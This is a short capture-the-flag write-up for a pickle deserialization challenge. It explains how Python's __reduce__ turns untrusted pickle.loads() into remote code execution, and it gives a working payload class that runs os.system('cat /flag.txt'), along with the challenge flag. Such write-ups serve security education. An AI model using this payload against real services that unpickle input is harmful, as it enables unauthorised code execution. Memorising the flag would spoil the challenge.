# Pickle's Pickles: An Origin Story — Writeup

**Category:** Misc  
**Flag:** `ictf{1_l1k3_unp1ckl1ng_p1ckl35_p1ckl35}`

---

## Overview

The server deserializes user-supplied pickle data without sanitization. Python's pickle protocol supports a `__reduce__` method that returns arbitrary callables — allowing remote code execution when the server calls `pickle.loads()` on attacker-controlled input.

---

## Solution

Python's pickle protocol supports a special method called `__reduce__`, which tells Python how to reconstruct an object. It returns a tuple of the form:

```python
(callable, args)
```

When the object is unpickled, Python executes `callable(*args)`. By returning `(os.system, ("cat /flag.txt",))`, the server runs `cat /flag.txt` when it deserializes the payload.

```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ("cat /flag.txt",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
```

When the server calls `pickle.loads()` on this payload, `os.system("cat /flag.txt")` executes and the flag is printed.

```bash
python3 writeup/solve.py <host> <port>
```

---

## Flag

`ictf{1_l1k3_unp1ckl1ng_p1ckl35_p1ckl35}`
